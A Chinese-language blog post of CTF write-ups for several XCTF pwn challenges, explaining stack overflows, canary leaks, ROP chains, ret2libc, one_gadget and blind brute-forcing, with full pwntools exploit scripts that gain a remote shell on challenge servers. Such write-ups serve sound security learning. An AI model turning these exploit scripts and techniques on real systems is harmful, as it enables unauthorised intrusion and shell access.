---
title: XCTF-Pwn-Advance
date: 2020-04-18 22:03:23
cover: https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/AdvanceCover.png
tags: 
- CTF
- PWN
---

# fogot

nc连接题目

![nc](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%8810.04.30.png)

阅读文本，这个程序大概是一个检查邮箱格式是否合法的程序。

拖进ida分析

![main](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.54.22.png)

分两部分来看main函数，前半部分有数个函数指针，指向的是很多个只输出一条文本的函数。，接着用户的两次输入，可以看到有两处溢出，溢出点分别在33行和41行。继续看下半部分。

![main2](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.55.24.png)

有一段代码，解读一下就是在对我们第二次输入的邮箱地址进行逐个字符的分析，当找到‘@’时，就继续寻找‘.’，中间如果有没能找到的关键字符就执行不同的提示函数，前一段的数个函数指针指向的就是不同的提示函数。每完成一个要求v14就加1，最后调用不同的函数。

看一下栈

![栈](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%887.58.28.png)

我们输入的邮箱地址程序里又正好给了可以getflag的函数，所以我们的攻击思路就是，利用溢出漏洞覆盖某个函数指针指向的函数为目标函数，然后满足代码条件使它执行。

我选了v12函数指针，exp如下

![exp](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/fogot/%E6%88%AA%E5%B1%8F2020-04-18%20%E4%B8%8B%E5%8D%888.08.53.png)

‘a@a.comm’最后会调用v12，后面的部分覆盖v12指向的函数。

# Mary_Morton

连接题目看一下

![nc](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.18.png)

可以选择攻击方式，栈溢出或者格式化字符串，但是这道题真的是想考察这两个知识而已吗？

拖进ida分析

![main](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.26.08.png)

可以看出程序有canary保护

main函数就是让用户选择，然后调用不同的函数的，主要看sub_4008EB和sub_400960

sub_4008EB

![4008eb](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.00.png)

如题目所说，确实存在一个格式化字符串漏洞，再去看sub_400960

![400960](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.31.12.png)

同样也真的存在一个栈溢出漏洞，那我们的攻击思路就有了：

先利用格式化字符串漏洞得到canary的值，再利用栈溢出漏洞构造rop链调用flag函数。canary的位置，首先计算步长，也就是printf取参数指针到buf的距离，测试得出是6，再加上buf到v2的距离0x90-0x8=0x88(十进制17)，所以17+6=23

exp如下

![exp](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/Mary_Morton/%E6%88%AA%E5%B1%8F2020-04-20%20%E4%B8%8B%E5%8D%884.30.04.png)

花了我最长时间的地方居然是处理接收到的canary值，很多写法都莫名报错，最后这样写是可以的。

# pwn-200

*\*这题用到pwntools的一个功能DynELF*

nc连接只有一次输出一次输入，拖进ida分析

![main](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.30.png)

定义了很多变量，但是也没用到，调用了sub_8048484

![8048484](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.08.50.png)

很明显在line 6存在栈溢出漏洞，但是没有system函数，也没有shellcode，所以要用到DynELF。*（libcSearch也是查找libc用的，但是我并没有用过）*

exp如下

![exp](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%888.17.47.png)

在使用DynELF的功能前需要先设定一个dyn对象，在line 12，第一个参数指定leak地址用的函数，第二个参数是目标程序。

*DynELF的lookup函数就是利用我们写的leak函数来循环爆破寻找system的地址，leak函数有一定的格式。*

shellcode可以通过一段可用的bss段储存

![bss](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-200/%E6%88%AA%E5%B1%8F2020-04-23%20%E4%B8%8B%E5%8D%889.34.53.png)

exp逻辑不复杂，但是要注意堆栈的恢复和一些细节。

# Pwn-100

*\*这道题花了很长时间，主要花时间在想用DynELF做，到最后也没有写出来，还是用LibcSearcher解了。*

![nc](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.18.58.png)

链接看一下，直接有输入，一直输一直输，要很长才会输出一个bye～，ida看一下

![ida](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.26.png)

主函数没东西，跟踪到40068E看一下

![68e](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.39.png)

声明了一个v1，调用40063D，注意传参传了一个200，继续看

![63d](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.19.49.png)

一个执行200次的循环，循环体是一个只读入1个字节的read，显然这里存在溢出。

exp：

![exp](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn-100/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%886.33.55.png)

第16行为什么这样写，需要自己去调试出来。

*LibcSearcher和Ropgadget真好用。*

# 反应釜开关控制

有故事背景，还有多层的代码，感觉是个好玩的题，结果一看发现就是简单的栈溢出

![exp](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/%E5%8F%8D%E5%BA%94%E9%87%9C%E6%8E%A7%E5%88%B6%E5%BC%80%E5%85%B3/%E6%88%AA%E5%B1%8F2020-05-10%20%E4%B8%8B%E5%8D%888.36.03.png)

非常简单，看了官方wp发现这原来是一道盲打。emmm，果然是道好题。

# pwn1

*\*因为期末导致一段时间没有做pwn了，拿这道题找找感觉*

题目描述没有过多信息，看题。

![sec](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175926.png)

64位。

三个选项，1.储存，2.打印，3.退出

看main函数

![main](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/pwn1/%E6%89%B9%E6%B3%A8%202020-07-07%20175517.png)

s的大小是0x80个字节，read却可以读取0x100个字节，存在很明显的溢出。但是有canary保护所以我们首先要泄漏canary。之前利用过格式化字符串泄漏canary，这次要利用puts函数的特性来泄漏。

puts函数只有遇到空字节才会停止输出，即使是0a（换行）也不会停止。canary的第一个字节是空字节，所以puts不会把canary输出，我们只要溢出覆盖掉canary的第一个字节就可以把canary泄漏出来了。

s距离canary 0x88个字节，要覆盖掉canary的首位就构造一个0x89个字符的payload。

`payload=0x85*'a'+'N0P3'`

获得canary之后就可以进一步泄漏库函数地址计算offset了。

`payload=0x84*'a'+'N0P3'+p64(canary)+'b'*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)`

小片段是通过ROPgadget找到的。

获得offset之后就可以按照一般的ret2libc方法get shell了。但是这里对payload的长度有限制（0x100），所以用one_gadget来解。

最后的payload

`payload=0x84*'a'+'N0P3'+p64(canary)+'b'*0x8+p64(GetShell)`

Exp

```python
#coding=utf-8
from pwn import*
context.log_level='debug'
res=remote('220.249.52.133',36024)
elf=ELF('./babystack')
libc=ELF('./libc-2.23.so')
res.recvuntil('>> ')
payload=0x85*'a'+'N0P3'
res.send('1')
res.send(payload)
#res.recv()不知道为什么不需要接收
res.recvuntil('>> ')
res.send('2')
canary_raw=res.recvuntil('\n---')
canary=u64('\x00'+canary_raw[137:137+7])#得到canary(canary的高位被我们覆盖了，补一个）
print('Get Canary!')
#--------------------------------------------------------
#ROPgadget --binary babystack --only "pop|ret"|grep "rdi"
start_addr=0x400720
pop_rdi=0x400a93
puts_got=elf.got['puts']
puts_plt=0x400690
payload=0x84*'a'+'N0P3'+p64(canary)+'b'*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(start_addr)
res.send('1')
res.send(payload)
res.recv()#需要接收一次空
res.recvuntil('>> ')
res.send('3')
puts_got=u64(res.recv(6).ljust(8,'\x00'))
print('Get Puts_Got!')
#--------------------------------------------------------
#One_gadget 
shell= 0x45216
puts_libc=libc.symbols['puts']
offset=puts_got-puts_libc
GetShell=offset+shell
payload=0x84*'a'+'N0P3'+p64(canary)+'b'*0x8+p64(GetShell)
res.send('1')
res.send(payload)
#res.recv()不知道为什么不需要接收
res.recvuntil('>> ')
res.send('3')
res.interactive()
```

*在ida的伪代码的36行有一个sub_400826函数，是puts的再封装，无额外代码。但是这个函数却存在“失效”的现象。理论上在exp每次发送完payload后都应该接收一次空，再接收主界面字符串。但是经过测试只有第二次payload发送后才需要。具体原因未知，麻烦大佬路过解释指点一下。*

# stack2

*\*终于遇到了必须动调的题目了*

看一下程序的情况

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8810.28.31.png)

32位的，并且有canary保护，估计又要绕过canary了。

程序是一个平均数计算器。

![ida](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/stack2Ida.jpg)

3号更换数字功能没有对用户输入的位置进行检查，存在数组越界漏洞。这个漏洞意味着我们可以对从数组的首地址开始到**低地址**方向上的所有数据进行更改。

那么我们就可以直接绕过canary以“合法”的方式修改返回地址，构造rop。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.07.02.png)

在函数列表里有一个函数hackhere，直接开了bash。那么我们似乎只要调用这个函数就可以了。接下来就是最重要的找偏移，从数组首地址到返回地址的距离是多少。起初我是以ida静态分析的栈来算的，得到的是0x74。怎么都不对，后来看了其他师傅的wp发现原来程序实际运行时的偏移不一样。

所以我们要动态调试一下。

我在line 30下了断点，因为此处会向数组存储数据，第一次存储数据时的eax的值就是数组的首栈地址。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.44.23.png)

程序到达断点，输入一个9

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8A%E5%8D%8811.45.27.png)

看到高亮行正要向eax指向的栈地址放入数据，数据正是我们刚刚输入的9。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.09.32.png)

记录一下此时的eax ,0xFFEF2258。找到数组首地址后我们就要找函数的返回地址了。当程序执行ret的时候，esp一定是指向返回地址的。所以我们在主函数的return 0处下断点，选择5，退出程序。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.25.png)



![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/stack2/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%881.10.41.png)

此时esp指向0xFFEF22DC，大地址减去小地址就得到了正确偏移0x84。（这两个地址的寻找一定要在一次调试中找出来，因为栈地址是随机的）

算出了偏移我们就可以进行攻击了，但是直接调用hackhere函数并不可以，因为目标主机上并没有bash，所以我们要利用/bin/bash的后两文起一个sh，构造简单的rop。

exp:

```python
from pwn import*
res=remote('220.249.52.133',30504)
context.log_level = 'debug'
res.recvuntil('have:\n')
res.sendline('1')
res.recv()
res.sendline('9')
def change(posite,num):
	res.recvuntil('exit\n')
	res.sendline('3')
	res.recvuntil('which number to change:\n')
	res.sendline(str(posite))
	res.recvuntil('new number:\n')
	res.sendline(str(num))
change(0x84, 0x50)
change(0x85, 0x84)
change(0x86, 0x04)
change(0x87, 0x08)
change(0x8c, 0x87)
change(0x8d, 0x89)
change(0x8e, 0x04)
change(0x8f, 0x08)
res.sendline('5')
res.interactive()
```

前四个change是调用system函数，后四个是传入参数"sh"。

虽然查到的保护机制并没有开启PIE，但是栈地址仍然是随机的。程序运行起来看到的才是真阿。

# warmup

*\*简单的盲打*

第一次认真做盲pwn，之前在比赛中尝试过但没有做出，相比之下这道题确实比较简单。

nc看一下

![nc](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.37.41.png)

给了我们一个地址，应该是执行这个函数就能get shell。

盲pwn，输了%d测试没有格式化字符串漏洞，估计就是栈溢出了。

暴破exp：

```python
from pwn import*
Target=0x40060d
#context.log_level='debug'
def Attack(PaddingLen,bit):
    try:
        res=remote("220.249.52.133",39150)
        res.recvuntil('>')
        if bit==32:
            payload='a'*PaddingLen+p32(Target)
        else:
            payload='b'*PaddingLen+p64(Target)
        res.sendline(payload)
        ret=res.recv()
        if len(ret)>0:
            print(ret)
        else:
            res.interactive()
    except:
        res.close()
   print("Go on")
for i in range(100):
    Attack(i,32)
    Attack(i,64)
print("Finish")

```

每次攻击都会测试32位与64位。exp写的太烂，出flag也不会停下。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/warmup/%E6%88%AA%E5%B1%8F2020-07-14%20%E4%B8%8B%E5%8D%889.22.26.png)

flag夹杂在中间。期间还返回过奇怪的“-Warm up-”字符串，由于没有程序不知为何。

# welpwn

*\*这是一道很棒的pwn题，就如它的名字一样。*

看一下保护机制

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.49.21.png)

64位的程序。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.37.png)

读取了0x400字节到buf，没有溢出。继续看echo函数。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.50.45.png)

可以看到刚才我们输入到字符串被拷贝进了s2，拷贝结束后最后一位改成0。但是s2仅仅只有16字节长而已，显然存在溢出。当时误以为这是一个类似【stack2】的题，简单构造了一个rop链最后多加一个用于归零的字符。并不可以。后来发现原来在拷贝时遇到\x00时就会停止，可是我们两个地址之间必有\x00。也就是说我们最多只能执行ret到一个地址。怎么利用呢？

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.33.png)

在这里下个断点，gdb看一下。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.57.51.png)

可以看到我们输入的字符串在fc0，经过拷贝到了fa0，两者间的距离是0x20。

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.51.10.png)

知道了buf是紧邻返回地址的，我们就可以构造一个巧妙的rop链。大概的思路是：我们写好padding溢出后加上一个可以pop 0x20个字节的gadget（下面称为pop20）后面跟上正常的rop链。这样为什么可行呢？拷贝结束后s2只有从padding到pop20的payload，而buf是完整的。程序溢出后返回地址被覆盖成pop20，执行后紧邻的buf会被pop 0x20个字节，也就是从padding到pop20都被pop了，所以紧接着的后半段payload就可以正常执行了。

不得不说pwn真是太益智了。

这个pop20可以通过Ropgadget来找

![](https://n0p3.oss-cn-beijing.aliyuncs.com/Blog/XCTF-Pwn-Advance/welpwn/%E6%88%AA%E5%B1%8F2020-07-16%20%E4%B8%8B%E5%8D%8812.59.42.png)

第一个就正好。4*8=32（0x20）。就算没有找到也没关系，可以多个pop连在一起实现。

exp：

```python
from pwn import*
from LibcSearcher import*
res=remote("220.249.52.133",59879)
context.log_level='debug'
elf=ELF('./pwn')
start=elf.symbols['_start']
write_plt=elf.plt['write']
write_got=elf.got['write']
clean_padding=0x40089c#pop 0x20byte
pop_rdi=0x4008A3
pop_rsi_r15=0x4008a1
payload='a'*0x10+'b'*0x8+p64(clean_padding)+p64(pop_rdi)+p64(1)+p64(pop_rsi_r15)+p64(write_got)+p64(0)+p64(write_plt)+p64(start)
res.recvuntil('RCTF\n')
res.sendline(payload)
write_got=res.recv(8)
write_got=u64(write_got)
print(hex(write_got))
Searcher=LibcSearcher('write',0x2b0)
offset=write_got-Searcher.dump("write")
system=Searcher.dump("system")+offset
binsh=Searcher.dump("str_bin_sh")+offset
res.recvuntil('RCTF\n')
payload='a'*0x10+'b'*0x8+p64(clean_padding)+p64(pop_rdi)+p64(binsh)+p64(system)
res.sendline(payload)
res.interactive()

```

这道题还有非常坑的一点，puts函数和printf函数失效，看来还是用write来泄漏地址最稳定。

*学到许多阿。pwn真是太益智了。